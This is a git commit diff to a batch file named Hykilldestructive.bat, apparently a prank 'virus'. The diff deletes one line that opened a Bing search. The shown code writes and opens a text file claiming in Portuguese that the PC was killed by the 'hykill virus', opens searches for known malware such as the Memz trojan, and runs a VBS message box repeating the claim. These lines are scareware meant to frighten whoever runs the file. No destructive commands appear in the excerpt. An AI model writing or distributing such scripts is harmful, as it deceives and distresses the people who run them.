10e713fab1eb3d4a5345061534a3fb131565f2c7
EduardozinYT <158329963+EduardozinYT@users.noreply.github.com>
2024-02-22 18:17:03 -0300

    Update Hykilldestructive.bat

--- Hykilldestructive.bat
+++ Hykilldestructive.bat
@@ -3,7 +3,6 @@ echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
 Start hahahahahahahahahahahah.txt
 start https://www.google.com/search?client=opera&q=Malwers&sourceid=opera&ie=UTF-8&oe=UTF-8
 start https://www.bing.com/search?q=Memz+trojan&qs=n&form=QBRE&sp=-1&ghc=2&lq=0&pq=memz+trojan&sc=11-11&sk=&cvid=C61B8060DD13413397FB14ECA316EB6D&ghsh=0&ghacc=0&ghpl=
-start https://www.bing.com/search?q=Monoxide&qs=n&form=QBRE&sp=-1&ghc=1&lq=0&pq=monoxide&sc=11-8&sk=&cvid=7E17D7D9ADC3429A9A029903C7FDE95D&ghsh=0&ghacc=0&ghpl=
 echo MsgBox "Hykill matou seu pc",16,"HAHAHAHAHAHHAHAHAH" > Hykill.vbs
 Start Hykill.vbs
 Start Hykill.vbs
